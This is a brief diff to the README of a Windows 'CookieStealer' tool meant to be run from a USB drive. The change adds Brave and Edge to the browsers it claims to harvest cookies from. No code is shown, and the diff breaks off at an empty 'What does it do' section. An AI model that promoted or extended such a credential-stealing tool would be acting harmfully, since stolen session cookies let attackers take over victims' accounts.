@@ -1,5 +1,5 @@
 # CookieStealer ``Windows PC Only``
-Cookie Stealer for USB Drive Supports 4 browsers: `Yandex Browser`, `Chrome`, `Mozilla Firefox`, `Opera Browser`.
+Cookie Stealer for USB Drive Supports 4 browsers: `Yandex Browser`, `Chrome`, `Mozilla Firefox`, `Opera Browser`. `Brave`, `Edge`
 
 # What does it do:
 ```
